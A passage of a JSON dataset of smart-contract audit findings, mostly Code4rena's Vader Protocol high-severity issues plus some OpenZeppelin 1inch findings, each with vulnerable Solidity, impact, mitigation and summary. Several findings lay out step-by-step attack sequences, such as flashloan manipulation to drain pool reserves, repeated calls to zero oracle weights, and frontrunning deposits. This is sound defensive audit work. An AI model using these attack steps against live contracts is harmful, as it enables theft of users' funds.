vAmount);\n    vader.burn(vAmount);\n\n    uAmount = (vPrice * vAmount) / 1e18;\n\n    if (cycleTimestamp <= block.timestamp) {\n        cycleTimestamp = block.timestamp + 24 hours;\n        cycleMints = uAmount;\n    } else {\n        cycleMints += uAmount;\n        require(\n            cycleMints <= dailyLimit,\n            \"USDV::mint: 24 Hour Limit Reached\"\n        );\n    }\n\n    if (exchangeFee != 0) {\n        uint256 fee = (uAmount * exchangeFee) / _MAX_BASIS_POINTS;\n        uAmount = uAmount - fee;\n        _mint(owner(), fee);\n    }\n\n    _mint(address(this), uAmount);\n\n    _createLock(LockTypes.USDV, uAmount);\n}\n```\n\nhttps://github.com/code-423n4/2021-12-vader/blob/main/contracts/tokens/USDV.sol#L100-L120\n```\nfunction burn(uint256 uAmount)\n    external\n    onlyWhenNotLocked\n    returns (uint256 vAmount)\n{\n    uint256 uPrice = lbt.getUSDVPrice();\n\n    _burn(msg.sender, uAmount);\n\n    vAmount = (uPrice * uAmount) / 1e18;\n\n    if (exchangeFee != 0) {\n        uint256 fee = (vAmount * exchangeFee) / _MAX_BASIS_POINTS;\n        vAmount = vAmount - fee;\n        vader.mint(owner(), fee);\n    }\n\n    vader.mint(address(this), vAmount);\n\n    _createLock(LockTypes.VADER, vAmount);\n}\n```\n\n## Tools Used\n\nManual code review.\n\n## Recommended Mitigation Steps\n\nConsider utilising both `getVaderPrice` and `getUSDVPrice` when calculating the expected `uAmount` and `vAmount` to mint or burn. To calculate `uAmount` in `mint`, `vPrice` should be denominated in `USDV/Vader`. To calculate `vAmount` in `burn`, `uPrice` should be denominated in `Vader/USDV`. It would be useful to add unit tests to test this explicitly as it is expected that users will interact with the `USDV.sol` contract frequently.",
      "summary": "\nA bug was discovered in the `USDV.mint` and `USDV.burn` functions of the `LiquidityBasedTwap` contract. This bug causes the incorrect calculation of `uAmount` and `vAmount` when minting and burning tokens, leading to a loss of either the user or the protocol. The bug is caused by the incorrect denomination of `vPrice` and `uPrice` when performing the calculations. The recommended mitigation step is to add unit tests to explicitly test this issue and to use both `getVaderPrice` and `getUSDVPrice` when calculating the expected amounts.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/164",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain",
        "leastwood"
      ]
    },
    {
      "id": "1241",
      "title": "[H-08] Reserve does not properly apply prices of VADER and USDV tokens",
      "impact": "HIGH",
      "content": "_Submitted by TomFrenchBlockchain_\n\nReserve pays out vastly higher (or lower) IL protection than it should.\n\n#### Proof of Concept\n\nConsider the lines 98 and 102 as shown on the link below:\n\n<https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/reserve/VaderReserve.sol#L95-L103>\n\nHere we multiply the IL experienced by the LP by a price for USDV or VADER as returned by the LBT. However the price from the oracle is a fixed point number (scaled up by 1e8 or 1e18 depending on the resolution of finding \"Oracle returns an improperly scaled USDV/VADER price\") and so a fixed scaling factor should be applied to convert back from a fixed point number to a standard integer.\n\nAs it stands depending on the branch which is executed, the amount to be reimbursed will be 1e18 times too large or too small. Should the \"else\" branch be executed the reserve will pay out much in terms of IL protection resulting in severe loss of funds. High severity.\n\n#### Recommended Mitigation Steps\n\nApply similar logic to as displayed here:\n\n<https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/tokens/USDV.sol#L109>\n\n\n\n***\n\n",
      "summary": "\nThis bug report details a vulnerability in the Reserve that allows for vastly higher or lower IL protection than it should. The proof of concept states that when the lines 98 and 102 of the code are multiplied by the LP, the price of USDV or VADER returned by the LBT is a fixed point number, meaning a scaling factor should be applied to convert it back to an integer. Depending on the branch executed, the reserve could pay out much more or less in terms of IL protection, resulting in a high severity loss of funds. The recommended mitigation step is to apply similar logic to the code found in the link provided.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/71",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "1240",
      "title": "[H-07] Redemption value of synths can be manipulated to drain VaderPoolV2 of all native assets in the associated pair",
      "impact": "HIGH",
      "content": "## Handle\n\nTomFrenchBlockchain\n\n\n## Vulnerability details\n\n## Impact\nDraining of funds from `VaderPoolV2`\n\n## Proof of Concept\n\nSee the `VaderPool.mintSynth` function:\nhttps://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex-v2/pool/VaderPoolV2.sol#L153-L194\n\nAs the pool's reserves can be manipulated through flashloans similar to on UniswapV2 (the slip mechanism can be mitigated by splitting the manipulation over a number of trades), an attacker may set the exchange rate between `nativeAsset` and synths (calculated from the reserves). An attacker can exploit this to drain funds from the pool.\n\n1. The attacker first flashloans and sells a huge amount of `foreignAsset` to the pool. The pool now thinks `nativeAsset` is extremely valuable.\n2. The attacker now uses a relatively small amount of `nativeAsset` to mint synths using `VaderPool.mintSynth`. As the pool thinks `nativeAsset` is very valuable the attacker will receive a huge amount of synths.\n3. The attacker can now manipulate the pool in the opposite direction by buying up the `foreignAsset` they sold to the pool. `nativeAsset` is now back at its normal price, or perhaps artificially low if the attacker wishes.\n4. The attacker now burns all of their synths. As `nativeAsset` is considered much less valuable than at the point the synths were minted it takes a lot more of `nativeAsset` in order to pay out for the burned synths.\n\nFor the price of a flashloan and some swap fees, the attacker has now managed to extract a large amount of `nativeAsset` from the pool. This process can be repeated as long as it is profitable.\n\n## Recommended Mitigation Steps\n\nTie the exchange rate use for minting/burning synths to a manipulation resistant oracle.",
      "summary": "\nThis bug report describes a vulnerability in the VaderPoolV2 contract that allows an attacker to drain funds from the pool. The attacker first flashloans and sells a large amount of foreignAsset to the pool. This causes the pool to think nativeAsset is extremely valuable. The attacker then uses a relatively small amount of nativeAsset to mint synths using the VaderPool.mintSynth function. As the pool thinks nativeAsset is very valuable, the attacker will receive a huge amount of synths. The attacker can then manipulate the pool in the opposite direction by buying up the foreignAsset they sold to the pool. This causes nativeAsset to return to its normal price, or artificially low if the attacker wishes. The attacker then burns all of their synths, which takes a lot more of nativeAsset in order to pay out for the burned synths. The end result is the attacker has extracted a large amount of nativeAsset from the pool. The recommended mitigation step is to tie the exchange rate used for minting/burning synths to a manipulation resistant oracle.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/5",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain",
        "certora"
      ]
    },
    {
      "id": "1239",
      "title": "[H-06] LPs of VaderPoolV2 can manipulate pool reserves to extract funds from the reserve.",
      "impact": "HIGH",
      "content": "## Handle\n\nTomFrenchBlockchain\n\n\n## Vulnerability details\n\n(Resubmission as the form crashed apologies if this is a duplicate)\n\n## Impact\nImpermanent loss protection can be exploited to drain the reserve.\n\n## Proof of Concept\nIn `VaderPoolV2.burn` we calculate the current losses that the LP has made to impermanent loss.\n\nhttps://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex-v2/pool/VaderPoolV2.sol#L265-L296\n\nThese losses are then refunded to the LP in VADER tokens from the reserve.\n\nhttps://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex-v2/router/VaderRouterV2.sol#L220\n\nThis loss is calculated by the current reserves of the pool so if an LP can manipulate the pool's reserves they can artificially engineer a huge amount of IL in order to qualify for a payout up to the size of their LP position.\n\nhttps://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/dex/math/VaderMath.sol#L72-L92\n\nThe attack is then as follows.\n1. Be an LP for a reasonable period of time (IL protection scales linearly up to 100% after a year)\n2. Flashloan a huge amount of one of the pool's assets.\n3. Trade against the pool with the flashloaned funds to unbalance it such that your LP position has huge IL.\n4. Remove your liquidity and receive compensation from the reserve for the IL you have engineered.\n5. Re-add your liquidity back to the pool.\n6. Trade against the pool to bring it back into balance.\n\nThe attacker now holds the majority of their flashloaned funds (minus slippage/swap fees) along with a large fraction of the value of their LP position in VADER paid out from the reserve. The value of their LP position is unchanged. Given a large enough LP position, the IL protection funds extracted from the reserve will exceed the funds lost to swap fees and the attacker will be able to repay their flashloan with a profit.\n\nThis is a high risk issue as after a year any large LP is incentivised and able to perform this attack and drain reserve funds.\n\n## Recommended Mitigation Steps\n\nUse a manipulation resistant oracle for the relative prices of the pool's assets (TWAP, etc.)",
      "summary": "\nThis bug report is about a vulnerability in the VaderPoolV2 code that can be exploited to drain the reserve. The vulnerability allows an LP to manipulate the pool's reserves to artificially engineer a huge amount of impermanent loss, which can then be refunded from the reserve in VADER tokens. This is done by flashloaning a huge amount of one of the pool's assets, trading against the pool to unbalance it, removing the liquidity and receiving compensation from the reserve for the IL, re-adding the liquidity, and then trading against the pool to bring it back into balance. After a year any large LP is incentivised and able to perform this attack and drain reserve funds. To mitigate this issue, it is recommended to use a manipulation resistant oracle for the relative prices of the pool's assets.",
      "quality_score": 4,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/55",
      "tags": [
        "Lending Pool",
        "Flash Loan"
      ],
      "finders": [
        "TomFrenchBlockchain",
        "hyh"
      ]
    },
    {
      "id": "1238",
      "title": "[H-05] Oracle returns an improperly scaled USDV/VADER price",
      "impact": "HIGH",
      "content": "_Submitted by TomFrenchBlockchain_\n\nInvalid values returned from oracle in vast majority of situations.\n\n#### Proof of Concept\n\nThe LBT oracle does not properly scale values when calculating prices for VADER or USDV. To show this we consider the simplest case where we expect USDV to return a value of $1 and show that the oracle does not return this value.\n\nConsider the case of the LBT oracle tracking a single USDV-DAI pair where USDV trades 1:1 for DAI and Chainlink reports that DAI is exactly $1. We then work through the lines linked below:\n\n<https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/lbt/LiquidityBasedTWAP.sol#L393-L409>\n\nFor L397 we get a value of 1e8 as Chainlink reports the price of DAI with 8 decimals of accuracy.\n\n    foreignPrice = getChainlinkPrice(address(foreignAsset));\n    foreignPrice = 1e8\n\nWe can set `liquidityWeights[i]` and `totalUSDVLiquidityWeight` both to 1 as we only consider a single pair so L399-401 becomes\n\n    totalUSD = foreignPrice;\n    totalUSD = 1e8;\n\nL403-408 is slightly more complex but from looking at the links below we can calculate `totalUSDV` as shown\n<https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/dex-v2/pool/VaderPoolV2.sol#L81-L90>\n<https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/external/libraries/FixedPoint.sol#L137-L160>\n\n    totalUSDV = pairData\n        .nativeTokenPriceAverage\n        .mul(pairData.foreignUnit)\n        .decode144()\n    // pairData.nativeTokenPriceAverage == 2**112\n    // pairData.foreignUnit = 10**18\n    // decode144(x) = x >> 112\n    totalUSDV = (2**112).mul(10**18).decode144()\n    totalUSDV = 10**18\n\nUsing `totalUSD` and `totalUSDV` we can then calculate the return value of `_calculateUSDVPrice`\n\n    returnValue = (totalUSD * 1 ether) / totalUSDV;\n\n    returnValue = 1e8 * 1e18 / 1e18\n\n    returnValue = 1e8\n\nFor the oracle implementation to be correct we then expect that the Vader protocol to treat values of 1e8 from the oracle to mean USDV is worth $1. However from the lines of code linked below we can safely assume that it is intended to be that values of 1e18 represent $1 rather than 1e8.\n\n<https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/tokens/USDV.sol#L76>\n<https://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/tokens/USDV.sol#L109>\n\nHigh severity issue as the oracle is crucial for determining the exchange rate between VADER and USDV to be used for IL protection and minting/burning of USDV - an incorrect value will result in the protocol losing significant funds.\n\n#### Recommended Mitigation Steps\n\nGo over oracle calculation again to ensure that various scale factors are properly accounted for. Some handling of the difference in the number of decimals between the chainlink oracle and the foreign asset should be added.\n\nBuild a test suite to ensure that the oracle returns the expected values for simple situations.\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-12-vader-findings/issues/70)**\n\n\n\n***\n\n",
      "summary": "\nA bug has been discovered in the LBT oracle of the VADER and USDV protocols. This bug results in invalid values being returned from the oracle in the vast majority of situations. When the oracle is tracking a single USDV-DAI pair, where USDV trades 1:1 for DAI and Chainlink reports that DAI is exactly $1, the oracle does not return the expected value of $1 for USDV. This is due to the oracle not properly scaling values when calculating prices for VADER or USDV. This is a high severity issue as the oracle is crucial for determining the exchange rate between VADER and USDV to be used for IL protection and minting/burning of USDV. An incorrect value will result in the protocol losing significant funds.\n\nThe recommended mitigation steps for this bug are to go over the oracle calculation again to ensure that various scale factors are properly accounted for, and to build a test suite to ensure that the oracle returns the expected values for simple situations.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/70",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "1237",
      "title": "[H-04] Vader TWAP averages wrong",
      "impact": "HIGH",
      "content": "_Submitted by cmichel_\n\nThe vader price in `LiquidityBasedTWAP.getVaderPrice` is computed using the `pastLiquidityWeights` and `pastTotalLiquidityWeight` return values of the `syncVaderPrice`.\n\nThe `syncVaderPrice` function does not initialize all weights and the total liquidity weight does not equal the sum of the individual weights because it skips initializing the pair with the previous data if the TWAP update window has not been reached yet:\n\n```solidity\nfunction syncVaderPrice()\n    public\n    override\n    returns (\n        uint256[] memory pastLiquidityWeights,\n        uint256 pastTotalLiquidityWeight\n    )\n{\n    uint256 _totalLiquidityWeight;\n    uint256 totalPairs = vaderPairs.length;\n    pastLiquidityWeights = new uint256[](totalPairs);\n    pastTotalLiquidityWeight = totalLiquidityWeight[uint256(Paths.VADER)];\n\n    for (uint256 i; i < totalPairs; ++i) {\n        IUniswapV2Pair pair = vaderPairs[i];\n        ExchangePair storage pairData = twapData[address(pair)];\n        // @audit-info lastMeasurement is set in _updateVaderPrice to block.timestamp\n        uint256 timeElapsed = block.timestamp - pairData.lastMeasurement;\n        // @audit-info update period depends on pair\n        // @audit-issue if update period not reached => does not initialize pastLiquidityWeights[i]\n        if (timeElapsed < pairData.updatePeriod) continue;\n\n        uint256 pastLiquidityEvaluation = pairData.pastLiquidityEvaluation;\n        uint256 currentLiquidityEvaluation = _updateVaderPrice(\n            pair,\n            pairData,\n            timeElapsed\n        );\n\n        pastLiquidityWeights[i] = pastLiquidityEvaluation;\n\n        pairData.pastLiquidityEvaluation = currentLiquidityEvaluation;\n\n        _totalLiquidityWeight += currentLiquidityEvaluation;\n    }\n\n    totalLiquidityWeight[uint256(Paths.VADER)] = _totalLiquidityWeight;\n}\n```\n\n###### POC\n\nThis bug leads to several different issues. A big one is that an attacker can break the price functions and make them revert.\nObserve what happens if an attacker calls `syncVaderPrice` twice in the same block:\n\n*   The first time any pairs that need to be updated are updated\n*   On the second call `_totalLiquidityWeight` is initialized to zero and all pairs have already been updated and thus skipped. `_totalLiquidityWeight` never increases and the storage variable `totalLiquidityWeight[uint256(Paths.VADER)] = _totalLiquidityWeight = 0;` is set to zero.\n*   DoS because calls to `getStaleVaderPrice` / `getVaderPrice` will revert in `_calculateVaderPrice` which divides by `totalLiquidityWeight = 0`.\n\nAttacker keeps double-calling `syncVaderPrice` every time an update window of one of the pairs becomes eligible to be updated.\n\n#### Impact\n\nThis bug leads to using wrong averaging and ignoring entire pairs due to their weights being initialized to zero and never being changed if the update window is not met.\nThis in turn makes it easier to manipulate the price as potentially only a single pair needs to be price-manipulated.\n\nIt's also possible to always set the `totalLiquidityWeight` to zero by calling `syncVaderPrice` twice which in turn reverts all transactions making use of the price because of a division by zero in `_caluclateVaderPrice`.\nAn attacker can break the `USDV.mint` minting forever and any router calls to `VaderReserve.reimburseImpermanentLoss` also fail as they perform a call to the reverting price function.\n\n#### Recommended Mitigation Steps\n\nEven if `timeElapsed < pairData.updatePeriod`, the old pair weight should still contribute to the total liquidity weight and be set in `pastLiquidityWeights`.\nMove the `_totalLiquidityWeight += currentLiquidityEvaluation` and the `pastLiquidityWeights[i] = pastLiquidityEvaluation` assignments before the `continue`.\n\n**[SamSteinGG (Vader) confirmed](https://github.com/code-423n4/2021-12-vader-findings/issues/148)**\n\n\n\n***\n\n",
      "summary": "\nThis bug report concerns a vulnerability in the LiquidityBasedTWAP.getVaderPrice function. The vulnerability is caused by the function syncVaderPrice not initializing all weights and the total liquidity weight not equaling the sum of the individual weights because it skips initializing the pair with the previous data if the TWAP update window has not been reached yet. The impact of this bug is that it leads to wrong averaging and ignoring entire pairs due to their weights being initialized to zero and never being changed if the update window is not met. This makes it easier to manipulate the price as potentially only a single pair needs to be price-manipulated. It's also possible to always set the totalLiquidityWeight to zero by calling syncVaderPrice twice, which in turn reverts all transactions making use of the price because of a division by zero in _caluclateVaderPrice. This can break the USDV.mint minting forever and any router calls to VaderReserve.reimburseImpermanentLoss also fail as they perform a call to the reverting price function. The recommended mitigation step is to move the _totalLiquidityWeight and pastLiquidityWeights assignments before the continue statement.",
      "quality_score": 3.5,
      "rarity_score": 3,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/148",
      "tags": [
        "TWAP"
      ],
      "finders": [
        "cmichel"
      ]
    },
    {
      "id": "1236",
      "title": "[H-03] Oracle doesn’t calculate USDV/VADER price correctly",
      "impact": "HIGH",
      "content": "## Handle\n\nTomFrenchBlockchain\n\n\n## Vulnerability details\n\n## Impact\n\nInvalid values returned from oracle for USDV and VADER prices in situations where the oracle uses more than one foreign asset.\n\n## Proof of Concept\n\nThe USDV price is calculated as so (for simplicity we'll consider a two pairs):\n\nhttps://github.com/code-423n4/2021-12-vader/blob/fd2787013608438beae361ce1bb6d9ffba466c45/contracts/lbt/LiquidityBasedTWAP.sol#L393-L409\n\n```\ntotalUSD =  (PriceForeign0InUSD * liquidityWeights[0] + PriceForeign1InUSD * liquidityWeights[1]) / totalUSDVLiquidityWeight;\n```\n\n`totalUSD` is then the average price of the foreign assets paired against USDV in terms of USD, weighted by the TVL of the relevant liquidity pool\n\n```\ntotalUSDV =\n  (pairData0\n      .nativeTokenPriceAverage\n      .mul(pairData0.foreignUnit)\n      .decode144() * liquidityWeights[0] +\n   pairData1\n      .nativeTokenPriceAverage\n      .mul(pairData1.foreignUnit)\n      .decode144() * liquidityWeights[1]) /\n  totalUSDVLiquidityWeight;\n\n// in pseudocode for readability\ntotalUSDV = (USDVPriceInForeign0 * liquidityWeights[0] + USDVPriceInForeign1 * liquidityWeights[1]) /  totalUSDVLiquidityWeight\n```\n\n`totalUSDV` is then the average price of USDV in terms of each of the foreign assets, weighted by the TVL of the relevant liquidity pool.\n\nIt should be fairly clear that this is the incorrect calculation as all the terms in `totalUSDV` are in different units - you can't average the price of USDV in ETH with the price of USDV in BTC and get a meaningful result.\n\nIt appears that the VADER team intended to calculate the price of USDV in terms of USD through a number of different paired assets and then average them at the end based on the liquidity in each pair but have started averaging too early.\n\nHigh severity issue as the oracle is crucial for determining the exchange rate between VADER and USDV to be used for IL protection and minting/burning of USDV - an incorrect value will result in the protocol losing significant funds.\n\n## Recommended Mitigation Steps\n\nReview the algorithm used for calculating the prices of assets and ensure that it's calculating what you expect.",
      "summary": "\nThis bug report is about an issue with the oracle of the VADER protocol. The oracle is used for determining the exchange rate between VADER and USDV, both of which are important for the protocol. The issue is that when the oracle uses more than one foreign asset, it is returning invalid values. \n\nThe proof of concept provided in the report explains that the USDV price is calculated by averaging the price of the foreign assets paired against USDV in terms of USD, weighted by the TVL of the relevant liquidity pool. However, it is noted that this is the incorrect calculation as all the terms in totalUSDV are in different units and cannot be averaged in this way. \n\nThe severity of the issue is high as it could lead to the protocol losing significant funds. The recommended mitigation step is to review the algorithm used for calculating the prices of assets and ensure that it is calculating what is expected.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/42",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain",
        "danb  leastwood"
      ]
    },
    {
      "id": "1235",
      "title": "[H-02] VaderPoolV2 owner can steal all user assets which are approved VaderPoolV2",
      "impact": "HIGH",
      "content": "## Handle\n\nTomFrenchBlockchain\n\n\n## Vulnerability details\n\n## Impact\n\nPossible theft of all user assets with an ERC20 approval on VaderPoolV2\n\n## Proof of Concept\n\nThe owner of `VaderPoolV2` can call the `setTokenSupport` function which allows the caller to supply any address from which to take the assets to provide the initial liquidity, the owner can also specify who shall receive the resulting LP NFT and so can take ownership over these assets. This call will succeed for any address which has an ERC20 approval on `VaderPoolV2` for USDV and `foreignAsset`.\n\nhttps://github.com/code-423n4/2021-12-vader/blob/00ed84015d4116da2f9db0c68db6742c89e73f65/contracts/dex-v2/pool/VaderPoolV2.sol#L442-L474\n\nThis in effect gives custody over all assets in user wallets which are approved on `VaderPoolV2` to Vader Protocol governance. This is especially problematic in the case of Vader Protocol as there's a single entity (i.e. the Council) which can force through a proposal to steal these assets for themselves with only the timelock giving protection to users, for this reason I give this high severity.\n\n## Recommended Mitigation Steps\n\nEnforce that the initial liquidity is provided by the VaderPoolV2 owner.",
      "summary": "\nA bug report has been filed regarding the possible theft of all user assets with an ERC20 approval on VaderPoolV2. The owner of VaderPoolV2 can call the setTokenSupport function which allows them to supply any address from which to take the assets to provide the initial liquidity, and also specify who shall receive the resulting LP NFT, giving them ownership over those assets. This means that the Vader Protocol governance has control over all assets in user wallets which are approved on VaderPoolV2. This is a high severity issue and mitigation steps are recommended to enforce that the initial liquidity is provided by the VaderPoolV2 owner.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/72",
      "tags": [],
      "finders": [
        "TomFrenchBlockchain"
      ]
    },
    {
      "id": "1234",
      "title": "[H-01] VaderPoolV2 minting synths & fungibles can be frontrun",
      "impact": "HIGH",
      "content": "## Handle\n\ncmichel\n\n\n## Vulnerability details\n\nThe `VaderPoolV2` `mintFungible` and `mintSynth` functions perform an unsafe `nativeAsset.safeTransferFrom(from, address(this), nativeDeposit)` with a parameter-specified `from` address.\n\nNote that these functions are not called by the Router, they are directly called on the pool.\nTherefore, users will usually be required to send two transactions, a first one approving the pool, and then a second one for the actual `mintSynth`.\n\nAn attacker can frontrun the `mintSynth(IERC20 foreignAsset, uint256 nativeDeposit, address from, address to)` function, use the same `from=victim` parameter but change the `to` parameter to the attacker.\n\n## Impact\nIt's possible to frontrun victims stealing their native token deposits and receiving synths / fungible tokens.\n\n## Recommended Mitigation Steps\nRemove the `from` parameter and always perform the `safeTransferFrom` call with `from=msg.sender`.",
      "summary": "\nA bug was reported in the `VaderPoolV2` `mintFungible` and `mintSynth` functions. These functions perform an unsafe `nativeAsset.safeTransferFrom(from, address(this), nativeDeposit)` with a parameter-specified `from` address. This means that users typically need to send two transactions, one to approve the pool and the second to mintSynth. An attacker can frontrun the `mintSynth(IERC20 foreignAsset, uint256 nativeDeposit, address from, address to)` function and use the same `from=victim` parameter but change the `to` parameter to the attacker, thus stealing the native token deposits and receiving synths / fungible tokens. To mitigate this issue, it is recommended to remove the `from` parameter and always perform the `safeTransferFrom` call with `from=msg.sender`.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "Vader Protocol",
      "source_link": "https://code4rena.com/reports/2021-12-vader",
      "github_link": "https://github.com/code-423n4/2021-12-vader-findings/issues/147",
      "tags": [
        "Front-Running"
      ],
      "finders": [
        "danb",
        "cccz",
        "cmichel",
        "leastwood",
        "TomFrenchBlockchain",
        "Critical"
      ]
    },
    {
      "id": "10697",
      "title": "[L14] Using deprecated Chainlink calls",
      "impact": "LOW",
      "content": "The [`ChainlinkCalculator`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol) contract is intended to be used to query Chainlink oracles. It does so via making calls to their [`latestTimestamp`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol#L23) and [`latestAnswer`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/helpers/ChainlinkCalculator.sol#L27) methods, [both of which have been deprecated](https://github.com/smartcontractkit/chainlink/blob/master/contracts/src/v0.6/FluxAggregator.sol#L335-L361). In fact, the methods are no longer present in the API of Chainlink aggregators [as of version three](https://github.com/smartcontractkit/chainlink/blob/master/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol).\n\n\nTo avoid potential future incompatibilities with Chainlink oracles, consider using the [`latestRoundData`](https://github.com/smartcontractkit/chainlink/blob/1adaebc7acedb3a133611ec5cbb61a852802ad33/contracts/src/v0.8/interfaces/AggregatorV3Interface.sol#L43) method instead.\n\n\n***Update:** Fixed in [pull request #67](https://github.com/1inch/limit-order-protocol/pull/67).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
      "source_link": "https://blog.openzeppelin.com/1inch-limit-order-protocol-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10696",
      "title": "[L13] Contradictory order handling when lacking parameters",
      "impact": "LOW",
      "content": "In the [`OrderMixin`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol) contract, the [`fillOrderTo`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L190) function makes internal calls to the [`_callGetMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L315) and [`_callGetTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L326) functions whenever a fill is attempted and either the [`makingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L233) or the [`takingAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L229) parameters are zero, respectively, or if the [`makingAmount` value is larger than the `remainingMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L236) value.\n\n\nThe `_callGetMakerAmount` and `_callGetTakerAmount` calls will lead to reversions if the order was not created with the [`getMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L316) or [`getTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L327) parameters, respectively, and a partial fill is being executed.\n\n\nAn [inline comment alongside `_callGetMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L328) and an [inline comment alongside `_callGetTakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L317) claim that “only whole fills are allowed” if the order was not created with `getMakerAmount` or `getTakerAmount` parameters.\n\n\nHowever, there are code paths for which this does not apply, because those paths do not check the `length`s of both `getMakerAmount` and `getTakerAmount` parameters.\n\n\nSpecifically, [when a `taker` specifies a `takerAmount` value for an order which only has a `getMakerAmount`, unless that call to `getMakerAmount` returns an amount larger than `remainingMakerAmount`](https://github.com/1inch/limit-order-protocol/blob/4d94eea25e4dac6271bfd703096a5c4a4d899b4a/contracts/OrderMixin.sol#L232-L234), a partial fill can be executed in contradiction to the inline documentation.\n\n\nThis leaves the intentionality of those code paths unclear. If this is the expected behavior, consider modifying the inline documentation so that it is more explicit. If this is unintentional behavior, consider always checking the lengths of both the `getMakerAmount` and the `getTakerAmount` parameters simultaneously so that the implementation reinforces the behavior described by the inline documentation.\n\n\n***Update:** Fixed in [pull request #79](https://github.com/1inch/limit-order-protocol/pull/79).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "1inch Limit Order Protocol Audit",
